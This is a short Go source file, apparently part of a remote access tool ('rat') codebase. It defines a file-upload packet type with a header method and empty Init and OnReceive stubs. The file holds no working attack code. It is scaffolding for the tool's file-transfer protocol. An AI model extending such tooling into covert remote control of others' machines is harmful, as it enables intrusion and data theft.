package main

import (
	"rat/common"
)

type UploadPacket struct {
	File  string `send`
	Final bool   `send`
	Data  []byte `send`
}

func (packet UploadPacket) Header() common.PacketHeader {
	return common.PutFileHeader
}

func (packet UploadPacket) Init(c *Client) {

}

func (packet UploadPacket) OnReceive(c *Client) error {
	return nil
}
